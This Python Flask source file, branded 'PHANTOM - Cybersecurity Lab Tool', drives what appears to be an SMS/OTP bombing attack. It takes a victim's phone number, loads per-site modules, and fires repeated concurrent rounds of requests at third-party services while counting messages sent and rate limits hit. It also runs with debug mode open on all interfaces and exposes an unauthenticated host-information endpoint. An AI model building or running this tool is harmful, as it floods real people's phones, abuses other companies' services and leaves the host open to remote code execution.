import os
import sys
import json
import time
import asyncio
import importlib
import pkgutil
import random
import threading
import socket
import platform
from flask import Flask, render_template, request, jsonify, Response
from flask_cors import CORS
import httpx
import requests
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
app = Flask(__name__)
CORS(app)

def import_submodules(package_path, package_name):
    results = {}
    for loader, name, is_pkg in pkgutil.walk_packages([package_path], package_name + '.'):
        try:
            results[name] = importlib.import_module(name)
        except Exception:
            pass
    return results

def get_all_modules():
    modules_path = os.path.join(os.path.dirname(__file__), 'modules')
    parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    if parent_dir not in sys.path:
        sys.path.insert(0, parent_dir)
    categories = {}
    module_functions = {}
    for category in os.listdir(modules_path):
        cat_path = os.path.join(modules_path, category)
        if os.path.isdir(cat_path) and (not category.startswith('_')):
            sites = []
            for f in os.listdir(cat_path):
                if f.endswith('.py') and f != '__init__.py':
                    site_name = f[:-3]
                    sites.append(site_name)
                    try:
                        mod = importlib.import_module(f'modules.{category}.{site_name}')
                        if hasattr(mod, site_name):
                            module_functions[site_name] = mod.__dict__[site_name]
                    except Exception as e:
                        print(f'Warning: Could not import {category}.{site_name}: {e}')
            if sites:
                categories[category] = sorted(sites)
    return (categories, module_functions)
attack_sessions = {}

class AttackSession:

    def __init__(self, session_id, phone, selected_sites, rounds):
        self.session_id = session_id
        self.phone = phone
        self.selected_sites = selected_sites
        self.rounds = rounds
        self.results = []
        self.status = 'idle'
        self.progress = 0
        self.total = len(selected_sites) * rounds
        self.start_time = None
        self.end_time = None
        self.current_round = 0
        self.stats = {'sent': 0, 'failed': 0, 'rate_limited': 0, 'errors': 0}
        self._stop_flag = False

    def to_dict(self):
        elapsed = 0
        if self.start_time:
            end = self.end_time or time.time()
            elapsed = round(end - self.start_time, 2)
        return {'session_id': self.session_id, 'phone': self.phone, 'status': self.status, 'progress': self.progress, 'total': self.total, 'current_round': self.current_round, 'rounds': self.rounds, 'results': self.results[-50:], 'stats': self.stats, 'elapsed': elapsed}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/sysinfo')
def api_sysinfo():
    info = {'hostname': socket.gethostname(), 'local_ip': 'unknown', 'public_ip': 'unknown', 'os': f'{platform.system()} {platform.release()}', 'os_version': platform.version(), 'architecture': platform.machine(), 'processor': platform.processor() or 'N/A', 'python': platform.python_version(), 'username': os.getlogin() if hasattr(os, 'getlogin') else 'N/A', 'ip_info': {}}
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        info['local_ip'] = s.getsockname()[0]
        s.close()
    except Exception:
        pass
    try:
        r = requests.get('https://ipinfo.io/json', timeout=5)
        if r.status_code == 200:
            ip_data = r.json()
            info['public_ip'] = ip_data.get('ip', 'unknown')
            info['ip_info'] = {'city': ip_data.get('city', 'N/A'), 'region': ip_data.get('region', 'N/A'), 'country': ip_data.get('country', 'N/A'), 'org': ip_data.get('org', 'N/A'), 'timezone': ip_data.get('timezone', 'N/A'), 'loc': ip_data.get('loc', 'N/A')}
    except Exception:
        pass
    return jsonify(info)

@app.route('/api/modules')
def api_modules():
    categories, _ = get_all_modules()
    return jsonify(categories)

@app.route('/api/attack', methods=['POST'])
def api_attack():
    data = request.json
    phone = data.get('phone', '').strip()
    selected = data.get('sites', [])
    rounds = min(int(data.get('rounds', 1)), 10)
    if not phone:
        return (jsonify({'error': 'Phone number is required'}), 400)
    if not selected:
        return (jsonify({'error': 'Select at least one target site'}), 400)
    session_id = f'atk_{int(time.time() * 1000)}'
    session = AttackSession(session_id, phone, selected, rounds)
    attack_sessions[session_id] = session
    thread = threading.Thread(target=run_attack_thread, args=(session,), daemon=True)
    thread.start()
    return jsonify({'session_id': session_id, 'message': 'Attack simulation started'})

@app.route('/api/attack/<session_id>')
def api_attack_status(session_id):
    session = attack_sessions.get(session_id)
    if not session:
        return (jsonify({'error': 'Session not found'}), 404)
    return jsonify(session.to_dict())

@app.route('/api/attack/<session_id>/stop', methods=['POST'])
def api_attack_stop(session_id):
    session = attack_sessions.get(session_id)
    if not session:
        return (jsonify({'error': 'Session not found'}), 404)
    session._stop_flag = True
    session.status = 'stopped'
    session.end_time = time.time()
    return jsonify({'message': 'Attack stopped'})

@app.route('/api/attack/<session_id>/stream')
def api_attack_stream(session_id):
    session = attack_sessions.get(session_id)
    if not session:
        return (jsonify({'error': 'Session not found'}), 404)

    def generate():
        last_count = 0
        while True:
            current_count = len(session.results)
            if current_count > last_count or session.status in ('completed', 'stopped'):
                data = json.dumps(session.to_dict())
                yield f'data: {data}\n\n'
                last_count = current_count
            if session.status in ('completed', 'stopped'):
                break
            time.sleep(0.3)
    return Response(generate(), mimetype='text/event-stream')

def run_attack_thread(session):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(run_attack(session))
    except Exception as e:
        session.status = 'completed'
        session.end_time = time.time()
        print(f'Attack error: {e}')
    finally:
        loop.close()

async def run_attack(session):
    session.status = 'running'
    session.start_time = time.time()
    _, module_functions = get_all_modules()
    async with httpx.AsyncClient(timeout=10, follow_redirects=True) as client:
        for round_num in range(1, session.rounds + 1):
            if session._stop_flag:
                break
            session.current_round = round_num
            tasks = []
            for site_name in session.selected_sites:
                if session._stop_flag:
                    break
                func = module_functions.get(site_name)
                if func:
                    tasks.append(execute_single_target(session, site_name, func, client, round_num))
                else:
                    session.results.append({'site': site_name, 'round': round_num, 'timestamp': time.strftime('%H:%M:%S'), 'status': 'module_not_found'})
                    session.stats['errors'] += 1
                    session.progress += 1
            if tasks:
                await asyncio.gather(*tasks)
            if round_num < session.rounds and (not session._stop_flag):
                await asyncio.sleep(1)
    session.status = 'completed'
    session.end_time = time.time()

async def execute_single_target(session, site_name, func, client, round_num):
    if session._stop_flag:
        return
    result_entry = {'site': site_name, 'round': round_num, 'timestamp': time.strftime('%H:%M:%S')}
    try:
        out = []
        await func(session.phone, client, out)
        if out:
            r = out[0]
            if r.get('sent'):
                result_entry['status'] = 'sent'
                session.stats['sent'] += 1
            elif r.get('rateLimit'):
                result_entry['status'] = 'rate_limited'
                session.stats['rate_limited'] += 1
            elif r.get('error'):
                result_entry['status'] = 'error'
                session.stats['errors'] += 1
            else:
                result_entry['status'] = 'failed'
                session.stats['failed'] += 1
        else:
            result_entry['status'] = 'no_response'
            session.stats['failed'] += 1
    except Exception as e:
        import traceback
        print(f'Error in {site_name}: {e}')
        traceback.print_exc()
        result_entry['status'] = 'error'
        result_entry['detail'] = str(e)[:100]
        session.stats['errors'] += 1
    session.results.append(result_entry)
    session.progress += 1
import webbrowser
from threading import Timer

def open_browser():
    webbrowser.open_new('http://127.0.0.1:5000/')
if __name__ == '__main__':
    print('  +==========================================+')
    print('  |   PHANTOM - Cybersecurity Lab Tool    |')
    print('  |   Developed by: shariqkhan256           |')
    print('  |   http://localhost:5000                  |')
    print('  +==========================================+\n')
    if os.environ.get('WERKZEUG_RUN_MAIN') != 'true':
        Timer(1, open_browser).start()
    app.run(debug=True, host='0.0.0.0', port=5000)